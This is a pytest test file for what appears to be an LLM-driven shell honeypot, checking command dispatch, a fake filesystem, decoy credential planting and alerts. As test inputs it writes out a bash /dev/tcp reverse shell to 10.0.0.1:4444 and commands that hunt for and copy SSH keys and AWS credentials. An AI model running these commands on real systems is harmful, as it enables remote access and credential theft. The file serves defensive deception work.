"""Unit tests for the Orchestrator dispatch flow + escalation."""
import pytest

from plenith.orchestrator import is_elevated, rewrite_cached_response

class TestDispatchOrder:
    async def test_cache_handles_whoami(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "whoami")
        assert body == "jdoe\n"
        assert src == "cache"

    async def test_vfs_write_short_circuits(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "echo hi > /tmp/foo")
        assert src == "vfs-write"
        assert body == ""

    async def test_vfs_read_short_circuits(self, orchestrator, session):
        await orchestrator.handle_command(session, "echo hello > /tmp/foo")
        body, src = await orchestrator.handle_command(session, "cat /tmp/foo")
        assert src == "vfs-read"
        assert body == "hello\n"

    async def test_ls_handler(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "ls -la ~/.aws")
        assert src == "ls"
        assert "credentials" in body
        assert "config" in body
        assert "drwx" in body  # long form

    async def test_presence_handler(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "who")
        assert src == "sim-bot"

    async def test_falls_through_to_llm(self, orchestrator, session, fake_llm):
        body, src = await orchestrator.handle_command(session, "some-weird-uncached-command --foo")
        assert src == "llm"
        assert len(fake_llm.calls) >= 1

class TestCdBuiltin:
    async def test_absolute_cd(self, orchestrator, session):
        await orchestrator.handle_command(session, "cd /tmp")
        assert session.cwd == "/tmp"

    async def test_tilde_cd(self, orchestrator, session):
        await orchestrator.handle_command(session, "cd /tmp")
        await orchestrator.handle_command(session, "cd ~")
        assert session.cwd == session.persona.home

    async def test_relative_cd(self, orchestrator, session):
        await orchestrator.handle_command(session, "cd ~/.aws")
        assert session.cwd.endswith("/.aws")

    async def test_dotdot_cd(self, orchestrator, session):
        await orchestrator.handle_command(session, "cd /tmp/foo")
        await orchestrator.handle_command(session, "cd ..")
        assert session.cwd == "/tmp"

class TestWriteOps:
    async def test_echo_double_quote(self, orchestrator, session):
        await orchestrator.handle_command(session, 'echo "hello world" > /tmp/q')
        body, _ = await orchestrator.handle_command(session, "cat /tmp/q")
        assert body == "hello world\n"

    async def test_echo_single_quote(self, orchestrator, session):
        await orchestrator.handle_command(session, "echo 'single' > /tmp/q")
        body, _ = await orchestrator.handle_command(session, "cat /tmp/q")
        assert body == "single\n"

    async def test_echo_no_newline(self, orchestrator, session):
        await orchestrator.handle_command(session, "echo -n nonl > /tmp/q")
        body, _ = await orchestrator.handle_command(session, "cat /tmp/q")
        assert body == "nonl"

    async def test_echo_append(self, orchestrator, session):
        await orchestrator.handle_command(session, "echo first > /tmp/q")
        await orchestrator.handle_command(session, "echo second >> /tmp/q")
        body, _ = await orchestrator.handle_command(session, "cat /tmp/q")
        assert body == "first\nsecond\n"

    async def test_truncate(self, orchestrator, session):
        await orchestrator.handle_command(session, "echo hi > /tmp/q")
        await orchestrator.handle_command(session, "> /tmp/q")
        body, _ = await orchestrator.handle_command(session, "cat /tmp/q")
        assert body == ""

    async def test_cp_missing_source_errors(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "cp /nope /tmp/x")
        assert src == "error"
        assert "No such file" in body

    async def test_mv_removes_source(self, orchestrator, session):
        await orchestrator.handle_command(session, "echo data > /tmp/old")
        await orchestrator.handle_command(session, "mv /tmp/old /tmp/new")
        body_new, _ = await orchestrator.handle_command(session, "cat /tmp/new")
        assert body_new == "data\n"
        body_old, src = await orchestrator.handle_command(session, "cat /tmp/old")
        assert src in ("llm", "error")  # falls through

    async def test_mkdir_then_rmdir(self, orchestrator, session):
        await orchestrator.handle_command(session, "mkdir /tmp/newdir")
        body, _ = await orchestrator.handle_command(session, "ls /tmp")
        assert "newdir" in body
        body, src = await orchestrator.handle_command(session, "rmdir /tmp/newdir")
        assert src == "vfs-rmdir"

    async def test_rmdir_non_empty_errors(self, orchestrator, session):
        await orchestrator.handle_command(session, "mkdir /tmp/full")
        await orchestrator.handle_command(session, "echo x > /tmp/full/file")
        body, src = await orchestrator.handle_command(session, "rmdir /tmp/full")
        assert src == "error"
        assert "not empty" in body

class TestFindGrep:
    async def test_find_by_name(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "find /home/jdoe -name id_rsa")
        assert src == "find"
        assert "/home/jdoe/.ssh/id_rsa" in body

    async def test_find_tolerates_tilde_dash(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "find /home/jdoe ~name id_rsa")
        assert src == "find"
        assert "id_rsa" in body
        assert "alert_credential_search" in [a["action"] for a in session.actions_taken]

    async def test_grep_recursive(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "grep -r AKIA /home/jdoe")
        assert src == "grep"
        assert "/home/jdoe/.aws/credentials" in body

    async def test_grep_list_only(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "grep -rl AKIA /home/jdoe")
        assert src == "grep"
        assert body.strip() == "/home/jdoe/.aws/credentials"

class TestElevation:
    async def test_not_elevated_baseline(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "whoami")
        assert body == "jdoe\n"
        assert src == "cache"
        assert not is_elevated(session)

    async def test_sudoers_alone_does_not_elevate(self, orchestrator, session):
        await orchestrator.handle_command(session, "sudo -l")
        await orchestrator.handle_command(session, "cat /etc/sudoers.d/zzz_compat")
        # Read alone is not elevation
        body, _ = await orchestrator.handle_command(session, "whoami")
        assert body == "jdoe\n"

    async def test_sudo_i_after_sudoers_elevates(self, orchestrator, session):
        await orchestrator.handle_command(session, "sudo -l")
        await orchestrator.handle_command(session, "cat /etc/sudoers.d/zzz_compat")
        await orchestrator.handle_command(session, "sudo -i")
        body, src = await orchestrator.handle_command(session, "whoami")
        assert body == "root\n"
        assert src == "cache+elevated"
        body, src = await orchestrator.handle_command(session, "id")
        assert body.startswith("uid=0(root)")

    async def test_reverse_shell_elevates_immediately(self, orchestrator, session):
        await orchestrator.handle_command(session, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert is_elevated(session)

    async def test_rewrite_only_affects_whoami_id(self, orchestrator, session):
        await orchestrator.handle_command(session, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        body, _ = await orchestrator.handle_command(session, "pwd")
        # pwd should still return real cwd, not change to /root
        assert "root" not in body

class TestMultiAlertLoop:
    async def test_multiple_alerts_in_single_command(self, orchestrator, session):
        # cp ~/.aws/credentials /tmp/loot.txt should fire:
        # - alert_credential_exfil (read of cred file)
        # - alert_payload_staging would need 3+ drops; this is only 1
        body, _ = await orchestrator.handle_command(session, "cp ~/.aws/credentials /tmp/loot.txt")
        acts = [a["action"] for a in session.actions_taken]
        assert "alert_credential_exfil" in acts

    async def test_decoy_credential_swallow_fires_both(self, orchestrator, session):
        # Age session past 600s to trigger plant_aws_credentials
        session.started_at -= 700
        session.first_seen_at = session.started_at
        await orchestrator.handle_command(session, "whoami")
        # Should now have planted ~/.aws/dev_credentials
        assert any("dev_credentials" in p for p in session.observed["decoys_planted"])
        # Reading it should fire BOTH credential_exfil AND decoy_swallowed
        await orchestrator.handle_command(session, "cat ~/.aws/dev_credentials")
        acts = [a["action"] for a in session.actions_taken]
        assert "alert_credential_exfil" in acts
        assert "alert_decoy_swallowed" in acts

class TestSysReconBuiltins:
    async def test_ps(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "ps")
        assert src == "sim-bot"
        assert "PID TTY" in body

    async def test_ps_aux(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "ps aux")
        assert src == "sim-bot"
        assert "USER" in body
        assert "COMMAND" in body
        assert "/sbin/init" in body

    async def test_netstat(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "netstat -tlnp")
        assert src == "sim-bot"
        assert "0.0.0.0:22" in body
        assert "LISTEN" in body

    async def test_ss(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "ss -tlnp")
        assert src == "sim-bot"
        assert "0.0.0.0:22" in body

class TestTextProcBuiltins:
    async def test_awk_extract_field(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "awk -F: '{print $1}' /etc/passwd")
        assert src == "awk"
        usernames = body.strip().split("\n")
        assert "root" in usernames
        assert "jdoe" in usernames

    async def test_sed_substitute(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "sed 's/root/HACK/g' /etc/passwd")
        assert src == "sed"
        assert "HACK" in body
        assert "root" not in body

    async def test_sed_range_print(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "sed -n '1,3p' /etc/passwd")
        assert src == "sed"
        lines = body.strip().split("\n")
        assert len(lines) == 3

class TestSimBotHandlers:
    async def test_who_returns_personas(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "who")
        assert src == "sim-bot"
        # Output format depends on real wall-clock time but should be deterministic
        # within the hour; we just check structure.
        # (May be empty outside work hours — the bot is hour-sensitive.)
        assert isinstance(body, str)

    async def test_uptime(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "uptime")
        assert src == "sim-bot"
        assert "up" in body
        assert "load average" in body

    async def test_last(self, orchestrator, session):
        body, src = await orchestrator.handle_command(session, "last")
        assert src == "sim-bot"
        assert "wtmp begins" in body
        assert "reboot" in body
